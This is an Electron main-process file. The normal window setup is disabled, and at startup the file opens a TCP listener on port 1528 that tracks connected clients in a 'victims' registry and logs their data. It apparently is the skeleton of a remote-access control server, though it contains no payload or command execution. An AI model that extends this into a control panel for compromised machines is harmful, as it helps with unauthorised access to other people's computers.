const {app, BrowserWindow} = require('electron');
const path = require('path');
const url = require('url');
const net = require('net');

let win;

function createWindow () {
  // Create the browser window.
  win = new BrowserWindow({width: 800, height: 600})

  // and load the index.html of the app.
  win.loadURL(url.format({
    pathname: path.join(__dirname, 'index.html'),
    protocol: 'file:',
    slashes: true
}));

  // Emitted when the window is closed.
  win.on('closed', () => {
    // Dereference the window object, usually you would store windows
    // in an array if your app supports multi windows, this is the time
    // when you should delete the corresponding element.
    win = null
});
}

// This method will be called when Electron has finished
// initialization and is ready to create browser windows.
// Some APIs can only be used after this event occurs.
// app.on('ready', createWindow);


app.on('activate', () => {
  // On macOS it's common to re-create a window in the app when the
  // dock icon is clicked and there are no other windows open.
  if (win === null) {
    createWindow();
  }
})

class server {

    constructor(config = {}) {
        this.victims = { online : {}, offline: {}, error : {} };
        this.config = config;
        this.server = net.createServer();
        this.server.listen(config.port);
        console.log("Server Started\n");
    }

    init(){
        this.server.on("connection", c => this.onConnect(c) );
    }

    onConnect(client){
        console.log("client connected");
        this.victims.online[client.remoteAddress] = client;

        client.on("close", e =>  this.onClientDisconnect(client) );
        client.on("data",  data => this.onData(data));

    }

    onClientDisconnect(client){
        console.log(`client disconnected ${client.remoteAddress}`);
        delete this.victims.online[client.remoteAddress]
    }

    onData(data){
        console.log("data >>>", data.toString());
    }
}


app.on('ready', () => {
    let s = new server({ port : 1528 });
    s.init();
});
